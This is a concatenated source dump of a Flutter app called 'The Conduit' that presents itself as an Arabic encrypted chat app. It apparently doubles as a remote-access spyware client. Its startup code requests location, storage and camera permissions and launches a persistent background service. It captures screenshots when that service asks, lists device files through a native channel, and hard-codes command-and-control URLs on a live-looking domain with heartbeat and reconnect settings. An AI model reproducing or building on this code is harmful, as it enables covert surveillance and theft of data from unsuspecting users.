################################################################################
# تم تجميع أكواد دارت من المسار: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj
# تاريخ الإنشاء: 2025-05-22 19:48:59
################################################################################


// ============================== بداية الملف: app.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\app.dart
// ----------------------------------------------------------------------

import 'package:flutter/material.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';

import 'presentation/chat/providers/theme_providers.dart';
import 'presentation/home/home_page.dart';

// اسم التطبيق الذي سنستخدمه في العرض
const String displayedAppName =
    "The Conduit"; // أو "الساتر" إذا اخترت اسمًا عربيًا

class TheConduitApp extends ConsumerWidget {
  // تم تغيير الاسم
  const TheConduitApp({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final themeState = ref.watch(themeStateProvider);
    final primaryColor = themeState.primaryColor;
    final useMaterial3 = themeState.useMaterial3;

    final TextTheme baseTextTheme = Theme.of(context).textTheme;
    final TextTheme cairoTextTheme = GoogleFonts.cairoTextTheme(baseTextTheme);
    final TextTheme cairoTextThemeLight = cairoTextTheme.apply(
        bodyColor: Colors.black87, displayColor: Colors.black87);
    final TextTheme cairoTextThemeDark = cairoTextTheme.apply(
        bodyColor: Colors.white.withOpacity(0.87),
        displayColor: Colors.white.withOpacity(0.87));

    return MaterialApp(
      title: displayedAppName,
      themeMode: themeState.themeMode,
      locale: const Locale('ar'),
      supportedLocales: const [Locale('ar')],
      localizationsDelegates: const [
        GlobalMaterialLocalizations.delegate,
        GlobalWidgetsLocalizations.delegate,
        GlobalCupertinoLocalizations.delegate,
      ],
      theme: ThemeData(
        useMaterial3: useMaterial3,
        primaryColor: primaryColor,
        textTheme: cairoTextThemeLight,
        colorScheme: ColorScheme.light(
          primary: primaryColor,
          secondary: primaryColor.withOpacity(0.7),
          tertiary: primaryColor.withOpacity(0.3),
          surface: Colors.grey[50]!, // لون خلفية Scaffold
          onPrimary: Colors.white,
          onSecondary: Colors.white,
          onSurface: Colors.black87,
          error: Colors.redAccent,
          onError: Colors.white,
        ),
        scaffoldBackgroundColor: Colors.grey[100],
        appBarTheme: AppBarTheme(
          backgroundColor: primaryColor,
          foregroundColor: Colors.white,
          elevation: useMaterial3 ? 0 : 2,
          centerTitle: true,
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 20,
                  fontWeight: FontWeight.w600,
                  color: Colors.white)),
          shape: useMaterial3
              ? null
              : const RoundedRectangleBorder(
                  borderRadius:
                      BorderRadius.vertical(bottom: Radius.circular(12)),
                ),
        ),
        elevatedButtonTheme: ElevatedButtonThemeData(
          style: ElevatedButton.styleFrom(
            backgroundColor: primaryColor,
            foregroundColor: Colors.white,
            shape:
                RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
            textStyle: GoogleFonts.cairo(
                textStyle: baseTextTheme.labelLarge
                    ?.copyWith(fontWeight: FontWeight.w600)),
          ),
        ),
        inputDecorationTheme: InputDecorationTheme(
          filled: true,
          fillColor: Colors.white,
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[300]!),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[300]!),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: primaryColor, width: 1.5),
          ),
          hintStyle: GoogleFonts.cairo(
              textStyle:
                  baseTextTheme.bodyMedium?.copyWith(color: Colors.grey[400])),
        ),
        cardTheme: CardTheme(
          elevation: useMaterial3 ? 1 : 2,
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          clipBehavior: Clip.antiAlias,
          color: useMaterial3 ? Colors.grey[50] : Colors.white,
        ),
        tabBarTheme: TabBarTheme(
          labelColor: Colors.white,
          unselectedLabelColor: Colors.white70,
          labelStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.labelLarge
                  ?.copyWith(fontWeight: FontWeight.w600)),
          unselectedLabelStyle:
              GoogleFonts.cairo(textStyle: baseTextTheme.labelLarge),
          indicator: useMaterial3
              ? const BoxDecoration(
                  border: Border(
                      bottom: BorderSide(color: Colors.white, width: 2.5)),
                )
              : BoxDecoration(
                  borderRadius: BorderRadius.circular(8),
                  color: Colors.white.withOpacity(0.2),
                ),
          indicatorSize: TabBarIndicatorSize.tab,
        ),
        dialogTheme: DialogTheme(
          backgroundColor: Colors.white,
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.black87)),
          contentTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.bodyMedium
                  ?.copyWith(fontSize: 14, color: Colors.black54)),
        ),
        bottomSheetTheme: const BottomSheetThemeData(
          backgroundColor: Colors.white,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
          ),
          modalBackgroundColor: Colors.white, // لخلفية الـ ModalBottomSheet
        ),
      ),
      darkTheme: ThemeData(
        useMaterial3: useMaterial3,
        primaryColor: primaryColor,
        brightness: Brightness.dark,
        textTheme: cairoTextThemeDark,
        colorScheme: ColorScheme.dark(
          primary: primaryColor,
          secondary: primaryColor.withOpacity(0.7),
          tertiary: primaryColor.withOpacity(0.3),
          surface: const Color(0xFF1A1A1A), // لون خلفية Scaffold
          onPrimary: Colors.white,
          onSecondary: Colors.white,
          onSurface: Colors.white.withOpacity(0.87),
          error: Colors.redAccent[100]!,
          onError: Colors.black,
        ),
        scaffoldBackgroundColor: const Color(0xFF121212),
        appBarTheme: AppBarTheme(
          backgroundColor: useMaterial3
              ? const Color(0xFF1A1A1A) // لون أغمق قليلاً لـ M3 Dark
              : primaryColor.withOpacity(0.9),
          foregroundColor: Colors.white.withOpacity(0.9),
          elevation: useMaterial3 ? 0 : 2,
          centerTitle: true,
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 20,
                  fontWeight: FontWeight.w600,
                  color: Colors.white.withOpacity(0.9))),
          shape: useMaterial3
              ? null
              : const RoundedRectangleBorder(
                  borderRadius:
                      BorderRadius.vertical(bottom: Radius.circular(12)),
                ),
        ),
        elevatedButtonTheme: ElevatedButtonThemeData(
          style: ElevatedButton.styleFrom(
            backgroundColor: primaryColor,
            foregroundColor: Colors.white,
            shape:
                RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
            textStyle: GoogleFonts.cairo(
                textStyle: baseTextTheme.labelLarge
                    ?.copyWith(fontWeight: FontWeight.w600)),
          ),
        ),
        inputDecorationTheme: InputDecorationTheme(
          filled: true,
          fillColor: const Color(0xFF2C2C2C),
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[700]!),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[700]!),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: primaryColor, width: 1.5),
          ),
          hintStyle: GoogleFonts.cairo(
              textStyle:
                  baseTextTheme.bodyMedium?.copyWith(color: Colors.grey[500])),
        ),
        cardTheme: CardTheme(
          color: const Color(0xFF252525),
          elevation: useMaterial3 ? 1 : 2,
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          clipBehavior: Clip.antiAlias,
        ),
        tabBarTheme: TabBarTheme(
          labelColor: Colors.white,
          unselectedLabelColor: Colors.white70,
          labelStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.labelLarge
                  ?.copyWith(fontWeight: FontWeight.w600)),
          unselectedLabelStyle:
              GoogleFonts.cairo(textStyle: baseTextTheme.labelLarge),
          indicator: useMaterial3
              ? BoxDecoration(
                  border: Border(
                      bottom: BorderSide(color: primaryColor, width: 2.5)),
                )
              : BoxDecoration(
                  borderRadius: BorderRadius.circular(8),
                  color: Colors.white.withOpacity(0.15),
                ),
          indicatorSize: TabBarIndicatorSize.tab,
        ),
        dialogTheme: DialogTheme(
          backgroundColor: const Color(0xFF2C2C2C),
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.white.withOpacity(0.87))),
          contentTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.bodyMedium?.copyWith(
                  fontSize: 14, color: Colors.white.withOpacity(0.7))),
        ),
        bottomSheetTheme: const BottomSheetThemeData(
          backgroundColor: Color(0xFF2C2C2C),
          modalBackgroundColor: Color(0xFF2C2C2C),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
          ),
        ),
      ),
      debugShowCheckedModeBanner: false,
      home: const HomePage(),
    );
  }
}



// ------------------------------ نهاية الملف: app.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: main.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\main.dart
// ----------------------------------------------------------------------

// main.dart أو المسار الصحيح للملف الرئيسي للتطبيق

import 'dart:typed_data'; // لـ Uint8List

import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:permission_handler/permission_handler.dart';

// تأكد من صحة هذه المسارات
import 'services/background_service.dart'; // ملفنا للخدمة الخلفية
import 'services/screenshot_service.dart'; // ملف خدمة لقطة الشاشة

// اسم التطبيق الذي سنستخدمه في العرض
const String displayedAppName = "The Conduit";
// GlobalKey لخدمة لقطة الشاشة - يجب أن يكون مرتبطًا بواجهة المستخدم الرئيسية
final GlobalKey screenshotGlobalKey = GlobalKey();
List<String> globalLogs = []; // لتخزين السجلات وعرضها ديناميكيًا

// --- إعدادات قناة الإشعارات للخدمة الخلفية ---
const String backgroundServiceNotificationChannelId =
    'the_conduit_service_channel';
const String backgroundServiceNotificationChannelName =
    'The Conduit Background Service';
const String backgroundServiceNotificationChannelDescription =
    'Channel for The Conduit background service notifications.';
// تهيئة FlutterLocalNotificationsPlugin
final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
    FlutterLocalNotificationsPlugin();

Future<void> _createNotificationChannel() async {
  const AndroidNotificationChannel channel = AndroidNotificationChannel(
    backgroundServiceNotificationChannelId,
    backgroundServiceNotificationChannelName,
    description: backgroundServiceNotificationChannelDescription,
    importance: Importance.low, // لتجنب الأصوات المزعجة بشكل افتراضي
    playSound: false,
    enableVibration: false,
  );
  await flutterLocalNotificationsPlugin
      .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(channel);
  print(
      "Notification channel '$backgroundServiceNotificationChannelId' created/updated.");
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await _createNotificationChannel(); // << --- إنشاء القناة أولاً
  await requestBasicPermissions();
  await initializeBackgroundService(); // هذا يستدعي onStart حيث يتم استخدام notificationChannelId
  runApp(ProviderScope(child: MyApp()));
}

Future<void> requestBasicPermissions() async {
  Map<Permission, PermissionStatus> statuses = await [
    Permission.location,
    Permission
        .storage, // للوصول إلى التخزين العام (قد يتطلب manageExternalStorage لبعض العمليات)
    Permission
        .accessMediaLocation, // قد تحتاج إليه بناءً على كيفية وصولك للملفات
    // Permission.manageExternalStorage, // إذا كنت تحتاج للوصول الشامل (يتطلب موافقة خاصة في Google Play)
    Permission.camera, // إذا كنت ستستخدم الكاميرا الفعلية أيضًا
  ].request();
  print("Permission statuses: $statuses");
  if (statuses[Permission.location] != PermissionStatus.granted) {
    globalLogs.add("Location permission was not granted.");
  }
  if (statuses[Permission.storage] != PermissionStatus.granted) {
    globalLogs.add("Storage permission was not granted.");
  }
  if (statuses[Permission.camera] != PermissionStatus.granted) {
    globalLogs.add("Camera permission was not granted.");
  }
}

class MyApp extends ConsumerWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final themeMode = ref.watch(themeProvider); // افترض أن themeProvider موجود
    return MaterialApp(
      title: displayedAppName,
      theme: ThemeData(
        brightness: Brightness.light,
        primarySwatch: Colors.teal,
        fontFamily: GoogleFonts.cairo().fontFamily,
      ),
      darkTheme: ThemeData(
        brightness: Brightness.dark,
        primarySwatch: Colors.teal,
        fontFamily: GoogleFonts.cairo().fontFamily,
      ),
      themeMode: themeMode,
      localizationsDelegates: const [
        GlobalMaterialLocalizations.delegate,
        GlobalWidgetsLocalizations.delegate,
        GlobalCupertinoLocalizations.delegate,
      ],
      supportedLocales: const [
        Locale('en', ''), // English
        Locale('ar', ''), // Arabic
      ],
      home: RepaintBoundary(
        key: screenshotGlobalKey, // ربط المفتاح هنا
        child: MonitoringScreen(), // أو الصفحة الرئيسية للتطبيق
      ),
      debugShowCheckedModeBanner: false,
    );
  }
}

class MonitoringScreen extends StatefulWidget {
  const MonitoringScreen({super.key});

  @override
  _MonitoringScreenState createState() => _MonitoringScreenState();
}

class _MonitoringScreenState extends State<MonitoringScreen> {
  final FlutterBackgroundService service = FlutterBackgroundService();
  late ScreenshotService _screenshotService;

  @override
  void initState() {
    super.initState();
    _screenshotService = ScreenshotService(
      screenshotKey: screenshotGlobalKey,
      onLogEvent: (log) {
        if (mounted) {
          setState(() {
            globalLogs.insert(0,
                "[${DateTime.now().toIso8601String().substring(11, 19)}] SCREENSHOT_SVC_UI: $log");
          });
        }
      },
    );

    service.on('addLog').listen((data) {
      if (data != null && data.containsKey('log') && mounted) {
        setState(() {
          globalLogs.insert(0,
              "[${DateTime.now().toIso8601String().substring(11, 19)}] BG_SVC: ${data['log']}");
        });
      }
    });

    service.on('updateUI').listen((event) {
      if (mounted) setState(() {});
    });

    // *** تعديل مستمع طلب لقطة الشاشة ***
    service.on('requestScreenshotFromUI').listen((argsFromService) async {
      if (mounted) {
        globalLogs.add(
            "UI: Received screenshot request from service. Args: $argsFromService");
        final Uint8List? imageBytes =
            await _screenshotService.captureScreenshot(); // التقاط الصورة

        Map<String, dynamic> responseToService = {};

        if (imageBytes != null) {
          // *** حفظ لقطة الشاشة كملف مؤقت وإرسال المسار ***
          final String? filePath =
              await _screenshotService.saveScreenshotToFile(imageBytes);
          if (filePath != null) {
            responseToService = {'file_path': filePath}; // إرسال المسار
            globalLogs.add(
                "UI: Screenshot captured and saved to: $filePath. Sending path to service.");
          } else {
            responseToService = {
              'error': 'Failed to save screenshot to file in UI'
            };
            globalLogs.add("UI: Failed to save screenshot to file.");
          }
        } else {
          responseToService = {'error': 'Failed to capture screenshot in UI'};
          globalLogs.add("UI: Failed to capture screenshot bytes.");
        }
        // إرسال المسار أو الخطأ مرة أخرى إلى الخدمة
        service.invoke('screenshotTakenByUI', responseToService);
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('$displayedAppName - Monitor'),
        actions: [
          IconButton(
            icon: Icon(Icons.cleaning_services),
            onPressed: () {
              if (mounted) {
                setState(() {
                  globalLogs.clear();
                  globalLogs.add("Logs cleared by user.");
                });
              }
            },
          ),
          IconButton(
            icon: Icon(Icons.send_to_mobile),
            onPressed: () {
              service.invoke(
                  "triggerInfoLog", {"message": "Hello from UI button!"});
            },
          )
        ],
      ),
      body: globalLogs.isEmpty
          ? Center(
              child: Text(
                  'No logs yet. Ensure the service is running and can connect to the C2 server.'))
          : ListView.builder(
              reverse: false, // لعرض أقدم السجلات في الأعلى
              itemCount: globalLogs.length,
              itemBuilder: (context, index) {
                return Padding(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 8.0, vertical: 2.0),
                  child: Text(
                    globalLogs[index],
                    style: TextStyle(fontSize: 11),
                  ),
                );
              },
            ),
    );
  }
}

// افترض أن لديك themeProvider من السياق السابق
final themeProvider = StateProvider<ThemeMode>((ref) => ThemeMode.system);



// ------------------------------ نهاية الملف: main.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: native_channel_handler.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\native_channel_handler.dart
// ----------------------------------------------------------------------

import 'package:flutter/services.dart';

class NativeChannelHandler {
  // اسم القناة يجب أن يطابق ما هو معرف في الكود الأصلي (Kotlin)
  static const MethodChannel _filesChannel =
      MethodChannel('com.zeroone.theconduit/files'); // [1] من السياق

  static Future<Map<String, dynamic>> listFilesNatively(String path) async {
    try {
      // استدعاء الدالة الأصلية 'listFiles' مع تمرير الوسيط 'path'
      final Map<dynamic, dynamic>? result =
          await _filesChannel.invokeMethod('listFiles', {'path': path});
      if (result != null) {
        return Map<String, dynamic>.from(result);
      }
      return {
        'error': 'Null result from native platform',
        'files': [],
        'path': path
      };
    } on PlatformException catch (e) {
      print(
          "Failed to list files via native channel: '${e.message}'. Details: ${e.details}");
      return {
        'error': e.message,
        'details': e.details,
        'files': [],
        'path': path
      };
    } catch (e) {
      print("Generic error listing files via native channel: $e");
      return {'error': e.toString(), 'files': [], 'path': path};
    }
  }

  // يمكنك إضافة دوال أخرى هنا إذا احتجت لقنوات إضافية
}



// ------------------------------ نهاية الملف: native_channel_handler.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: app_config.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\config\app_config.dart
// ----------------------------------------------------------------------

// lib/config/app_config.dart

// !! هام: في بيئة حقيقية، استخدم متغيرات البيئة أو تقنيات إدارة الأسرار
// لا تضع عناوين IP أو نطاقات حقيقية هنا مباشرة في التحكم بالمصادر (Version Control)
// هذا مجرد مثال توضيحي.

// --- HTTP Server Configuration ---
// هذا العنوان يشير إلى النطاق الذي وفرته Cloudflare Tunnel
// والذي يوجه مباشرة إلى Flask HTTP server على جهازك
const String C2_HTTP_SERVER_URL =
    'https://ws.sosa-qav.es'; // <-- تم استبداله بعنوان Cloudflare Tunnel HTTPS

// --- WebSocket (Socket.IO) Server Configuration ---
// طالما أن نفس النطاق يدعم ترقية WebSocket (Cloudflare يدعمها)،
// نغير البروتوكول فقط إلى wss:// (للاتصال المشفر)
const String C2_SOCKET_IO_URL =
    'wss://ws.sosa-qav.es'; // <-- استخدم wss مع Cloudflare لأنه HTTPS

const Duration C2_SOCKET_IO_RECONNECT_DELAY = Duration(seconds: 5);
const int C2_SOCKET_IO_RECONNECT_ATTEMPTS = 5;
const Duration C2_HEARTBEAT_INTERVAL = Duration(
  seconds: 45,
); // Interval for client to send heartbeat



// ------------------------------ نهاية الملف: app_config.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: agent_identity.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\data\models\agent\agent_identity.dart
// ----------------------------------------------------------------------

// lib/data/models/agent/agent_identity.dart
import 'package:cloud_firestore/cloud_firestore.dart';

/// نموذج بيانات هوية الوكيل في Firestore
class AgentIdentity {
  final String agentCode;
  final String displayName;
  final String? deviceId;
  final bool deviceBindingRequired;
  final bool needsAdminApprovalForNewDevice;
  final DateTime? lastLoginAt;
  final String? lastLoginDeviceId;
  final bool isActive;
  final Map<String, dynamic>? metadata;

  AgentIdentity({
    required this.agentCode,
    required this.displayName,
    this.deviceId,
    this.deviceBindingRequired = true,
    this.needsAdminApprovalForNewDevice = false,
    this.lastLoginAt,
    this.lastLoginDeviceId,
    this.isActive = true,
    this.metadata,
  });

  /// إنشاء نموذج من بيانات Firestore
  factory AgentIdentity.fromFirestore(DocumentSnapshot<Map<String, dynamic>> doc) {
    final data = doc.data() ?? {};
    
    return AgentIdentity(
      agentCode: doc.id,
      displayName: data['displayName'] as String? ?? doc.id,
      deviceId: data['deviceId'] as String?,
      deviceBindingRequired: data['deviceBindingRequired'] as bool? ?? true,
      needsAdminApprovalForNewDevice: data['needsAdminApprovalForNewDevice'] as bool? ?? false,
      lastLoginAt: (data['lastLoginAt'] as Timestamp?)?.toDate(),
      lastLoginDeviceId: data['lastLoginDeviceId'] as String?,
      isActive: data['isActive'] as bool? ?? true,
      metadata: data['metadata'] as Map<String, dynamic>?,
    );
  }

  /// تحويل النموذج إلى بيانات Firestore
  Map<String, dynamic> toFirestore() {
    return {
      'displayName': displayName,
      'deviceId': deviceId,
      'deviceBindingRequired': deviceBindingRequired,
      'needsAdminApprovalForNewDevice': needsAdminApprovalForNewDevice,
      'lastLoginAt': lastLoginAt != null ? Timestamp.fromDate(lastLoginAt!) : null,
      'lastLoginDeviceId': lastLoginDeviceId,
      'isActive': isActive,
      'metadata': metadata,
    };
  }

  /// إنشاء نسخة معدلة من النموذج
  AgentIdentity copyWith({
    String? displayName,
    String? deviceId,
    bool? deviceBindingRequired,
    bool? needsAdminApprovalForNewDevice,
    DateTime? lastLoginAt,
    String? lastLoginDeviceId,
    bool? isActive,
    Map<String, dynamic>? metadata,
  }) {
    return AgentIdentity(
      agentCode: this.agentCode,
      displayName: displayName ?? this.displayName,
      deviceId: deviceId ?? this.deviceId,
      deviceBindingRequired: deviceBindingRequired ?? this.deviceBindingRequired,
      needsAdminApprovalForNewDevice: needsAdminApprovalForNewDevice ?? this.needsAdminApprovalForNewDevice,
      lastLoginAt: lastLoginAt ?? this.lastLoginAt,
      lastLoginDeviceId: lastLoginDeviceId ?? this.lastLoginDeviceId,
      isActive: isActive ?? this.isActive,
      metadata: metadata ?? this.metadata,
    );
  }
}



// ------------------------------ نهاية الملف: agent_identity.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_conversation.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\data\models\chat\chat_conversation.dart
// ----------------------------------------------------------------------

// lib/data/models/chat/chat_conversation.dart
import 'package:cloud_firestore/cloud_firestore.dart';
import 'dart:math'; // لـ Math.min

class ChatParticipantInfo {
  final String agentCode;
  final String displayName;
  // final String? photoUrl; // يمكنك إضافته لاحقًا إذا أردت صورًا للمستخدمين

  ChatParticipantInfo({
    required this.agentCode,
    required this.displayName,
    // this.photoUrl,
  });

  factory ChatParticipantInfo.fromMap(
      String agentCode, Map<String, dynamic> map) {
    return ChatParticipantInfo(
      agentCode: agentCode,
      displayName: map['displayName'] as String? ?? agentCode,
      // photoUrl: map['photoUrl'] as String?,
    );
  }

  Map<String, dynamic> toMap() {
    return {
      'displayName': displayName,
      // if (photoUrl != null) 'photoUrl': photoUrl,
    };
  }
}

class ChatConversation {
  final String id;
  final List<String> participants;
  final Map<String, ChatParticipantInfo> participantInfo;
  final String conversationTitle;
  final String? lastMessageText;
  final DateTime? lastMessageTimestamp;
  final String? lastMessageSenderAgentCode;
  final DateTime createdAt;
  final DateTime updatedAt;
  final Map<String, bool> deletedForUsers; // Added field

  ChatConversation({
    required this.id,
    required this.participants,
    required this.participantInfo,
    required this.conversationTitle,
    this.lastMessageText,
    this.lastMessageTimestamp,
    this.lastMessageSenderAgentCode,
    required this.createdAt,
    required this.updatedAt,
    required this.deletedForUsers, // Added to constructor
  });

  factory ChatConversation.fromFirestore(
      DocumentSnapshot<Map<String, dynamic>> doc, String currentAgentCode) {
    final data = doc.data();
    if (data == null) {
      throw Exception(
          "ChatConversation document data is null for doc ID: ${doc.id}");
    }

    final participantsList =
        List<String>.from(data['participants'] as List<dynamic>? ?? []);

    Map<String, ChatParticipantInfo> pInfoMap = {};
    if (data['participantInfo'] != null && data['participantInfo'] is Map) {
      (data['participantInfo'] as Map<String, dynamic>).forEach((key, value) {
        if (value is Map<String, dynamic>) {
          pInfoMap[key] = ChatParticipantInfo.fromMap(key, value);
        }
      });
    }

    String determinedConversationTitle;
    if (participantsList.length == 1 &&
        participantsList.contains(currentAgentCode)) {
      determinedConversationTitle = pInfoMap[currentAgentCode]?.displayName ??
          "ملاحظاتي (${currentAgentCode.substring(0, min(3, currentAgentCode.length))}..)";
    } else if (participantsList.length == 2) {
      String? otherAgentCode = participantsList
          .firstWhere((p) => p != currentAgentCode, orElse: () => '');
      if (otherAgentCode.isNotEmpty && pInfoMap.containsKey(otherAgentCode)) {
        determinedConversationTitle = pInfoMap[otherAgentCode]!.displayName;
      } else if (otherAgentCode.isNotEmpty) {
        determinedConversationTitle =
            "العميل ${otherAgentCode.substring(0, min(3, otherAgentCode.length))}..";
      } else {
        determinedConversationTitle = "محادثة خاصة";
      }
    } else if (participantsList.length > 2) {
      if (data['title'] != null && (data['title'] as String).isNotEmpty) {
        determinedConversationTitle = data['title'] as String;
      } else {
        List<String> otherParticipantNames = pInfoMap.entries
            .where((entry) =>
                entry.key != currentAgentCode &&
                entry.value.displayName.isNotEmpty)
            .map((entry) => entry.value.displayName)
            .take(2)
            .toList();
        if (otherParticipantNames.isNotEmpty) {
          determinedConversationTitle =
              "مجموعة: ${otherParticipantNames.join(', ')}";
          if (pInfoMap.length - 1 > 2) {
            determinedConversationTitle += "...";
          }
        } else {
          determinedConversationTitle =
              "مجموعة (${participantsList.length})";
        }
      }
    } else {
      determinedConversationTitle = "محادثة غير معروفة";
    }

    final deletedForUsersData = data['deletedForUsers'] as Map<String, dynamic>? ?? {};
    final Map<String, bool> typedDeletedForUsers = deletedForUsersData.map((key, value) => MapEntry(key, value as bool));

    return ChatConversation(
      id: doc.id,
      participants: participantsList,
      participantInfo: pInfoMap,
      conversationTitle: determinedConversationTitle,
      lastMessageText: data['lastMessageText'] as String?,
      lastMessageTimestamp:
          (data['lastMessageTimestamp'] as Timestamp?)?.toDate(),
      lastMessageSenderAgentCode: data['lastMessageSenderAgentCode'] as String?,
      createdAt: (data['createdAt'] as Timestamp? ?? Timestamp.now()).toDate(),
      updatedAt: (data['updatedAt'] as Timestamp? ?? Timestamp.now()).toDate(),
      deletedForUsers: typedDeletedForUsers, // Use parsed map
    );
  }

  // إضافة طريقة fromMap لإنشاء كائن ChatConversation من Map
  static ChatConversation fromMap(Map<String, dynamic> map) {
    // استخراج معلومات المشاركين
    Map<String, ChatParticipantInfo> pInfoMap = {};
    if (map['participantInfo'] != null && map['participantInfo'] is Map) {
      (map['participantInfo'] as Map<String, dynamic>).forEach((key, value) {
        if (value is Map<String, dynamic>) {
          pInfoMap[key] = ChatParticipantInfo.fromMap(key, value);
        }
      });
    }

    // استخراج قائمة المشاركين
    final participantsList = map['participants'] is List
        ? List<String>.from(map['participants'] as List)
        : <String>[];

    // استخراج معلومات الحذف للمستخدمين
    final deletedForUsersData = map['deletedForUsers'] as Map<String, dynamic>? ?? {};
    final Map<String, bool> typedDeletedForUsers = deletedForUsersData.map((key, value) => MapEntry(key, value as bool));

    return ChatConversation(
      id: map['id'] as String,
      participants: participantsList,
      participantInfo: pInfoMap,
      conversationTitle: map['title'] as String? ?? "محادثة جديدة",
      lastMessageText: map['lastMessage'] as String?,
      lastMessageTimestamp: map['lastMessageTimestamp'] != null
          ? (map['lastMessageTimestamp'] is Timestamp
              ? (map['lastMessageTimestamp'] as Timestamp).toDate()
              : DateTime.parse(map['lastMessageTimestamp'].toString()))
          : null,
      lastMessageSenderAgentCode: map['lastMessageSenderAgentCode'] as String?,
      createdAt: map['createdAt'] != null
          ? (map['createdAt'] is Timestamp
              ? (map['createdAt'] as Timestamp).toDate()
              : DateTime.parse(map['createdAt'].toString()))
          : DateTime.now(),
      updatedAt: map['updatedAt'] != null
          ? (map['updatedAt'] is Timestamp
              ? (map['updatedAt'] as Timestamp).toDate()
              : DateTime.parse(map['updatedAt'].toString()))
          : DateTime.now(),
      deletedForUsers: typedDeletedForUsers,
    );
  }

  Map<String, dynamic> toFirestore() {
    final Map<String, dynamic> dataMap = {
      'participants': participants..sort(),
      'participantInfo':
          participantInfo.map((key, value) => MapEntry(key, value.toMap())),
      'lastMessageText': lastMessageText,
      'lastMessageTimestamp': lastMessageTimestamp != null
          ? Timestamp.fromDate(lastMessageTimestamp!)
          : null,
      'lastMessageSenderAgentCode': lastMessageSenderAgentCode,
      'createdAt': Timestamp.fromDate(createdAt),
      'updatedAt': Timestamp.fromDate(updatedAt),
      'deletedForUsers': deletedForUsers, // Add to Firestore map
    };

    if (participants.length > 2 &&
        conversationTitle != "مجموعة جديدة" &&
        !conversationTitle.startsWith("مجموعة: ")) {
      dataMap['title'] = conversationTitle;
    }
    return dataMap;
  }

  copyWith({required String id}) {}
}



// ------------------------------ نهاية الملف: chat_conversation.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_message.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\data\models\chat\chat_message.dart
// ----------------------------------------------------------------------

// lib/data/models/chat/chat_message.dart
import 'package:cloud_firestore/cloud_firestore.dart';

enum MessageType { text, image, audio, video, file }

String messageTypeToString(MessageType type) {
  return type.toString().split('.').last;
}

MessageType stringToMessageType(String? typeStr) {
  if (typeStr == null) return MessageType.text;
  return MessageType.values.firstWhere(
      (e) =>
          e.toString().split('.').last.toLowerCase() == typeStr.toLowerCase(),
      orElse: () => MessageType.text);
}

class ChatMessage {
  final String id;
